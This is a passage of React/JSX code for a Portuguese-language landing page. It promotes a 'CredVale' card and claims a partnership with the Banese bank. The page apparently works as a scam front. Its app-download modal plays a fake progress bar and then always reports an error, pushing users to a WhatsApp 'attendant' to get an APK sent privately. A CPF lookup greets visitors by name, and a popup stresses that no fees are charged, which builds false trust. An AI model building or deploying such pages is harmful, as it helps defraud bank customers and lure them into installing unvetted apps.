          <section className="bg-emerald-800 text-white py-8 px-5 text-center relative overflow-hidden">
            <div className="absolute top-0 right-0 w-20 h-20 bg-emerald-400/10 rounded-full blur-xl"></div>
            <div className="absolute -bottom-6 -left-6 w-28 h-28 bg-emerald-900/30 rounded-full blur-xl"></div>
            <span className="text-[10px] font-bold tracking-widest uppercase bg-white/10 px-3 py-1.2 rounded-full inline-block">
              Banese + CredVale
            </span>
            <h2 className="font-display text-xl sm:text-2xl font-bold mt-2.5 leading-snug">
              Mais economia para sua saúde.<br />
              Mais benefícios para a sua vida.
            </h2>
            <p className="text-xs sm:text-sm text-emerald-100/80 mt-1.5 max-w-sm mx-auto leading-relaxed">
              Há mais de uma década cuidando da saúde financeira e do bem-estar dos brasileiros. A CredVale construiu uma história baseada em confiança, economia e inovação. Agora, junto ao Banese, oferece uma experiência ainda mais completa para seus correntistas.
            </p>
            <button onClick={goToCadastroBanese} className="mt-5 bg-white text-emerald-800 hover:bg-emerald-50 text-sm font-bold py-3 px-6 rounded-xl shadow-md transition-all active:scale-95 duration-200">
              Quero meu Cartão CredVale
            </button>
          </section>

        </main>

        {/* FOOTER */}
        <footer className="bg-emerald-950 text-slate-400 py-6 px-5 border-t border-emerald-900 text-xs text-center sm:text-left">
          <div className="flex flex-col items-center sm:items-start gap-1.5 mb-5">
            <div className="flex items-center gap-1.5">
              <div className="w-7 h-7 rounded-lg bg-emerald-700 flex items-center justify-center text-white">
                <CreditCard className="w-4 h-4" />
              </div>
              <span className="font-display font-bold text-base text-white tracking-tight">
                Cred<span className="text-emerald-400">Vale</span>
              </span>
              <span className="text-[8px] text-emerald-500 bg-emerald-900/50 px-1.5 py-0.5 rounded">Parceiro Banese</span>
            </div>
            <p className="text-slate-500 text-[10px] mt-1 text-center sm:text-left">
              CredVale Intermediação de Serviços de Saúde Ltda.
            </p>
          </div>
          <div className="space-y-1.5 text-slate-400 border-t border-emerald-900/60 pt-3 text-[11px]">
            <p><strong className="text-slate-300">CNPJ:</strong> 42.109.873/0001-92</p>
            <p><strong className="text-slate-300">Endereço:</strong> Av. Paulista, 1000, Bela Vista, São Paulo - SP</p>
            <p><strong className="text-slate-300">Telefone:</strong> 0800 591 0233</p>
            <p><strong className="text-slate-300">E-mail:</strong> contato@credvale.com.br</p>
          </div>
          <div className="flex justify-center sm:justify-start gap-3 mt-5 text-[10px] text-slate-500 border-t border-emerald-900/60 pt-3">
            <a href="/admin.html" className="hover:text-slate-300 transition-colors flex items-center gap-1">
              <Lock className="w-2.5 h-2.5" /> Admin
            </a>
            <span>•</span>
            <a href="#privacy" className="hover:text-slate-300 transition-colors">Política de Privacidade</a>
            <span>•</span>
            <a href="#terms" className="hover:text-slate-300 transition-colors">Termos de Uso</a>
          </div>
          <p className="text-[9px] text-slate-600 mt-5 text-center">&copy; 2026 CredVale. Todos os direitos reservados.</p>
        </footer>

        {/* SECURITY POPUP — Redesign Premium CredVale */}
        <AnimatePresence>
          {isSecurityPopupOpen && (
            <div className="fixed inset-0 z-[100] flex items-center justify-center p-5 bg-black/40 backdrop-blur-[6px]">
              <motion.div
                initial={{ scale: 0.92, opacity: 0, y: 16 }}
                animate={{ scale: 1, opacity: 1, y: 0 }}
                exit={{ scale: 0.92, opacity: 0, y: 16 }}
                transition={{ type: 'spring', damping: 26, stiffness: 280 }}
                className="w-full max-w-[420px] bg-white rounded-[22px] shadow-[0_20px_60px_-12px_rgba(0,0,0,0.15)] border border-slate-100 overflow-hidden"
              >
                {/* HEADER: Logo + Timer + Close */}
                <div className="flex items-center justify-between px-7 pt-6 pb-0">
                  <div className="flex items-center gap-2.5">
                    <div className="w-9 h-9 rounded-[10px] bg-gradient-to-br from-emerald-800 to-emerald-600 flex items-center justify-center text-white text-[7px] font-black tracking-tight shadow-sm">CV</div>
                    <span className="font-display font-bold text-[15px] text-[#1F2937] tracking-tight">CredVale</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <span className="text-[11px] font-semibold text-[#6B7280] bg-slate-50 px-2.5 py-1 rounded-lg border border-slate-100">{securityPopupCountdown}s</span>
                    <button onClick={() => setIsSecurityPopupOpen(false)} className="w-7 h-7 flex items-center justify-center rounded-full bg-slate-50 hover:bg-slate-100 text-slate-400 hover:text-slate-600 transition-all duration-200 border border-slate-100"><X className="w-3.5 h-3.5" /></button>
                  </div>
                </div>

                {/* CONTENT */}
                <div className="px-7 pt-5 pb-6 space-y-5">
                  {/* TITLE */}
                  <h3 className="font-display font-extrabold text-[22px] text-[#1F2937] leading-tight tracking-tight">
                    <span role="img" aria-label="atencao">⚠️</span> Atenção
                  </h3>

                  {/* WARNING BOX */}
                  <div className="bg-[#FFF8E8] border border-[#F4D06F]/60 rounded-[14px] p-4 flex items-start gap-3">
                    <span className="text-lg flex-shrink-0 mt-0.5">⚠️</span>
                    <div className="text-[14px] leading-relaxed text-[#92400E] font-medium">
                      A <strong className="text-emerald-600">CredVale</strong> <span className="text-[#DC2626] font-extrabold">NÃO</span> cobra qualquer valor antecipado.
                    </div>
                  </div>

                  {/* INFO BLOCKS */}
                  <div className="space-y-3">
                    <div className="flex items-start gap-3 pb-3 border-b border-slate-50">
                      <span className="text-base flex-shrink-0 mt-0.5">💳</span>
                      <div>
                        <p className="text-[15px] font-semibold text-[#1F2937]">Não solicitamos PIX, depósitos ou transferências.</p>
                        <p className="text-[13px] text-[#6B7280] mt-0.5">Nenhum pagamento antecipado é necessário para aprovação.</p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3 pb-3 border-b border-slate-50">
                      <span className="text-base flex-shrink-0 mt-0.5">🔒</span>
                      <div>
                        <p className="text-[15px] font-semibold text-[#1F2937]">Não cobramos para análise, liberação de limite ou emissão de cartão.</p>
                        <p className="text-[13px] text-[#6B7280] mt-0.5">Todo o processo é gratuito até a contratação.</p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <span className="text-base flex-shrink-0 mt-0.5">👤</span>
                      <div>
                        <p className="text-[15px] font-semibold text-[#1F2937]">Recebeu uma cobrança em nosso nome?</p>
                        <p className="text-[13px] text-[#6B7280] mt-0.5">Desconsidere imediatamente e <strong className="text-emerald-600 font-semibold">fale conosco</strong>.</p>
                      </div>
                    </div>
                  </div>

                  {/* SECURITY FOOTER */}
                  <div className="bg-emerald-50/70 border border-emerald-100 rounded-[14px] p-4 flex items-center gap-3">
                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" className="flex-shrink-0">
                      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                    </svg>
                    <div>
                      <p className="text-[13px] font-bold text-[#065F46]">Sua segurança é nossa prioridade.</p>
                      <p className="text-[12px] text-[#059669]/70">Credibilidade, transparência e respeito com você.</p>
                    </div>
                  </div>

                  {/* BUTTON */}
                  <button
                    onClick={() => setIsSecurityPopupOpen(false)}
                    className="w-full h-[52px] bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white font-bold text-[15px] rounded-[16px] transition-all active:scale-[0.97] duration-200 shadow-[0_4px_14px_rgba(5,150,105,0.25)] hover:shadow-[0_6px_20px_rgba(5,150,105,0.35)] flex items-center justify-center gap-2"
                  >
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                    Entendi
                  </button>
                </div>
              </motion.div>
            </div>
          )}
        </AnimatePresence>

        {!isSecurityPopupOpen && <WhatsAppButton />}

        {/* DOWNLOAD MODAL */}
        <AnimatePresence>
          {isDownloadOpen && (
            <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs">
              <motion.div initial={{ scale: 0.95, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.95, opacity: 0 }} className="w-full max-w-[360px] bg-white rounded-3xl overflow-hidden shadow-2xl p-6 border border-slate-100">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="font-display font-bold text-lg text-gray-900 flex items-center gap-1.5"><Smartphone className="w-5 h-5 text-emerald-600" /> Instalar CredVale App</h3>
                  <button onClick={() => setIsDownloadOpen(false)} className="text-gray-400 hover:text-gray-600"><X className="w-5 h-5" /></button>
                </div>
                {downloadStep === 'initial' ? (
                  <div>
                    <p className="text-xs text-gray-600 leading-relaxed">Faça o download do aplicativo CredVale diretamente para o seu celular.</p>
                    <div className="mt-5">
                      <button onClick={handleDownloadClick} className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3.5 rounded-xl shadow-md transition-all active:scale-95 duration-200 flex items-center justify-center gap-2"><Download className="w-4 h-4" /> Baixar Aplicativo</button>
                      <p className="text-[10px] text-gray-400 text-center mt-2">Arquivo APK oficial CredVale</p>
                    </div>
                  </div>
                ) : downloadStep === 'loading' ? (
                  <div className="text-center py-6">
                    <div className="w-12 h-12 border-4 border-emerald-100 border-t-emerald-600 rounded-full animate-spin mx-auto mb-4"></div>
                    <p className="text-sm font-bold text-slate-800">Preparando a instalação...</p>
                    <p className="text-xs text-gray-500 mt-1">Estamos preparando o aplicativo para o seu dispositivo.</p>
                    <div className="mt-4 w-full bg-slate-100 h-2 rounded-full overflow-hidden"><div className="bg-emerald-600 h-full transition-all duration-200" style={{ width: `${downloadProgress}%` }}></div></div>
                    <p className="text-[10px] text-gray-400 mt-2">{downloadProgress}%</p>
                  </div>
                ) : (
                  <div className="text-center py-2">
                    <p className="text-sm font-extrabold text-red-600 mb-3">📱 Instalar CredVale App</p>
                    <p className="text-xs font-bold text-red-600 leading-relaxed mb-2">😕 ⚠️ Houve um problema ao baixar o aplicativo.</p>
                    <p className="text-xs text-gray-600 leading-relaxed mb-2">Isso normalmente acontece quando a versão disponível não é compatível com o seu dispositivo.</p>
                    <p className="text-xs text-gray-600 leading-relaxed mb-2">Nossa equipe pode enviar a versão correta para você e ajudar na instalação.</p>
                    <p className="text-xs text-gray-500 leading-relaxed mb-4">Clique no botão abaixo e fale agora com um de nossos atendentes.</p>
                    <a href={(() => { var wa = sessionStorage.getItem('vs_support_wa') || ''; return wa ? 'https://wa.me/' + wa.replace(/\D/g, '') + '?text=Ol%C3%A1%21+Quero+ajuda+para+baixar+o+aplicativo+CredVale.' : '#'; })()} target="_blank" rel="noopener" className="block w-full bg-gradient-to-r from-[#25D366] to-[#128C7E] hover:opacity-95 text-white font-bold py-3.5 rounded-xl transition-all active:scale-95 duration-200 mb-2 text-sm">💬 Falar com um atendente</a>
                    <button onClick={() => { setIsDownloadOpen(false); setDownloadStep('initial'); }} className="w-full text-xs font-semibold text-gray-400 hover:text-gray-600 py-2">Fechar</button>
                  </div>
                )}
              </motion.div>
            </div>
          )}
        </AnimatePresence>

        {/* CPF MODAL */}
        <AnimatePresence>
          {isCpfModalOpen && (
            <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs">
              <motion.div initial={{ scale: 0.95, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.95, opacity: 0 }} className="w-full max-w-[380px] bg-white rounded-3xl overflow-hidden shadow-2xl border border-slate-100">
                {cpfResult === 'idle' && (
                  <div className="p-6">
                    <div className="flex justify-between items-center mb-4">
                      <h3 className="font-display font-bold text-lg text-gray-900 flex items-center gap-1.5"><Search className="w-5 h-5 text-emerald-600" /> Consultar CPF</h3>
                      <button onClick={() => { setIsCpfModalOpen(false); setCpfResult('idle'); }} className="text-gray-400 hover:text-gray-600"><X className="w-5 h-5" /></button>
                    </div>
                    <p className="text-xs text-gray-600 leading-relaxed mb-5">Informe seu CPF para verificar se você já possui cadastro ou iniciar uma nova solicitação.</p>
                    <div className="mb-5">
                      <label className="block text-[11px] font-bold text-gray-500 uppercase tracking-wider mb-1.5">CPF</label>
                      <input type="text" value={cpfValue} onChange={handleCpfInput} onKeyDown={(e) => { if (e.key === 'Enter') handleCpfSubmit(); }} placeholder="000.000.000-00" maxLength={14} className={`w-full px-4 py-3.5 bg-white border ${cpfError ? 'border-red-500 focus:ring-red-500' : 'border-gray-200 focus:border-emerald-500 focus:ring-emerald-500'} rounded-xl text-sm focus:outline-none focus:ring-1`} autoFocus />
                      {cpfError && <p className="text-[10px] text-red-500 font-bold mt-1.5">⚠ {cpfError}</p>}
                    </div>
                    <button onClick={handleCpfSubmit} disabled={cpfLoading} className="w-full bg-emerald-600 hover:bg-emerald-500 disabled:opacity-60 text-white font-bold py-3.5 rounded-xl transition-all active:scale-95 flex items-center justify-center gap-2 shadow-md">
                      {cpfLoading ? <><div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div> Verificando...</> : <><Search className="w-4 h-4" /> Consultar CPF</>}
                    </button>
                  </div>
                )}
                {cpfResult === 'found' && (
                  <div className="p-6 text-center">
                    <div className="w-14 h-14 rounded-full bg-green-50 border-4 border-green-500/20 flex items-center justify-center mx-auto mb-4"><Check className="w-6 h-6 text-emerald-500 stroke-[3]" /></div>
                    <h3 className="font-display font-bold text-lg text-gray-900 mb-1">Encontramos um cadastro!</h3>
                    <p className="text-xs text-gray-500 mb-1">CPF <strong className="text-gray-800">{cpfValue}</strong></p>
                    {cpfClientName && <p className="text-sm font-semibold text-emerald-600 mb-4">{cpfClientName}</p>}
                    <p className="text-xs text-gray-500 leading-relaxed mb-6">Localizamos seu cadastro em nossa base. Clique abaixo para continuar.</p>
                    <button onClick={continueCadastro} className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3.5 rounded-xl transition-all active:scale-95 flex items-center justify-center gap-2 shadow-md mb-2"><ArrowRight className="w-4 h-4" /> Continuar Cadastro</button>
                    <button onClick={() => { setIsCpfModalOpen(false); setCpfResult('idle'); }} className="text-xs font-semibold text-gray-400 hover:text-gray-600 py-2 transition-colors">Fechar</button>
                  </div>
                )}
                {cpfResult === 'notfound' && (
                  <div className="p-6 text-center">
                    <div className="w-14 h-14 rounded-full bg-amber-50 border-4 border-amber-500/20 flex items-center justify-center mx-auto mb-4"><Search className="w-6 h-6 text-amber-500" /></div>
                    <h3 className="font-display font-bold text-lg text-gray-900 mb-1">Não encontramos cadastro</h3>
                    <p className="text-xs text-gray-500 mb-1">CPF <strong className="text-gray-800">{cpfValue}</strong></p>
                    <p className="text-xs text-gray-500 leading-relaxed mb-6 mt-3">Este CPF não possui cadastro. Clique abaixo para assinar e começar a economizar.</p>
                    <button onClick={goToCadastro} className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3.5 rounded-xl transition-all active:scale-95 flex items-center justify-center gap-2 shadow-md mb-2"><Sparkles className="w-4 h-4" /> Assinar CredVale</button>
                    <button onClick={() => { setCpfResult('idle'); setCpfValue(''); }} className="text-xs font-semibold text-emerald-600 hover:text-emerald-500 py-2 transition-colors">Tentar outro CPF</button>
                  </div>
                )}
              </motion.div>
            </div>
          )}
        </AnimatePresence>

      </div>
    </div>
  );
}
